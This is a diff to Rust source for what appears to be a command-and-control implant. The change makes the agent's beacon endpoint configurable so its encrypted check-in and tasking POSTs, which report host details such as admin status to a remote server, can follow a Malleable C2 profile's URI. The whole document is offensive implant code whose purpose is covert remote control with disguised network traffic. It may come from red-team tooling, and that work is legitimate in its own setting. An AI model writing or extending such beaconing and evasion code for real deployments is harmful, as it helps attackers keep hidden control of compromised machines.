@@ -24,6 +24,9 @@ pub struct Config {
     /// are resolved relative to this and confined within it (no absolute paths,
     /// no `..` traversal) so the dev agent can't escape its sandbox.
     pub work_dir: PathBuf,
+    /// Beacon endpoint path — `/beacon`, or the Malleable C2 profile's http-post
+    /// `uri`. The agent POSTs the encrypted frame to `{server_url}{beacon_uri}`.
+    pub beacon_uri: String,
 }
 
 pub fn run(cfg: Config) -> anyhow::Result<()> {
@@ -42,6 +45,9 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
         is_admin: is_admin(),
     };
 
+    // Beacon endpoint: `/beacon`, or the profile's http-post URI when malleable.
+    let beacon_url = format!("{}{}", cfg.server_url, cfg.beacon_uri);
+
     // ---- check-in (retry until the server accepts us) ----------------------
     let mut counter = 0u64;
     let mut w = Writer::new();
@@ -50,7 +56,7 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
     loop {
         let frame = encode_frame(&pubkey, counter, &key, &info_plain);
         counter += 1;
-        match ureq::post(&format!("{}/beacon", cfg.server_url)).send_bytes(&frame) {
+        match ureq::post(&beacon_url).send_bytes(&frame) {
             Ok(_) => break,
             Err(e) => {
                 tracing::warn!(?e, "check-in failed; retrying");
@@ -74,7 +80,7 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
         counter += 1;
         pending_responses.clear();
 
-        let resp = match ureq::post(&format!("{}/beacon", cfg.server_url)).send_bytes(&frame) {
+        let resp = match ureq::post(&beacon_url).send_bytes(&frame) {
             Ok(r) => r,
             Err(e) => {
                 tracing::warn!(?e, "beacon POST failed");
